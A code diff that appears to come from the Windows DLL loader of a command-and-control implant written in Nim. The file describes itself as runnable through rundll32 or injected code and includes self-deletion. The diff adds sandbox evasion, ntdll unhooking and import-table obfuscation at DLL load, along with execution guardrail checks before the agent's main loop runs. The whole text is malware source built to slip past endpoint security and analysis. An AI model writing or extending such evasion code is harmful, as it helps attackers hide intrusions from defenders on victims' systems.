@@ -3,11 +3,18 @@
 
 import std/[times, random]
 import config, agent
+import utils/guardrails
 
 when defined(windows):
   import winim/lean
   import utils/self_delete
-  
+
+  # Evasion imports
+  when defined(evasion_dfr) or defined(evasion_iat_obf) or defined(evasion_unhook_ntdll):
+    import utils/evasion
+  when defined(sandbox_evasion):
+    import utils/sandbox
+
   # Import NimMain to initialize Nim runtime
   proc NimMain() {.cdecl, importc.}
   
@@ -17,7 +24,8 @@ when defined(windows):
   proc agentMain(param: pointer): DWORD {.stdcall.} =
     ## Background thread that runs the agent
     try:
-      # Call the shared agent main loop
+      if not checkGuardrails():
+        return 0
       runAgent()
       return 0
     except:
@@ -28,6 +36,8 @@ when defined(windows):
     ## This can be called via rundll32 or from injected code
     ## Runs agent directly (blocking) - rundll32 will wait for completion
     try:
+      if not checkGuardrails():
+        return TRUE
       runAgent()
       return TRUE
     except:
@@ -53,6 +63,12 @@ when defined(windows):
     of DLL_PROCESS_ATTACH:
       # Initialize Nim runtime once when DLL loads
       NimMain()
+      # Run sandbox evasion before anything else
+      when defined(sandbox_evasion):
+        runSandboxEvasion()
+      # Run evasion techniques immediately
+      when defined(evasion_dfr) or defined(evasion_iat_obf) or defined(evasion_unhook_ntdll):
+        runEvasionInit()
       # Disable thread library calls for this DLL
       discard DisableThreadLibraryCalls(hinstDLL)
       return TRUE
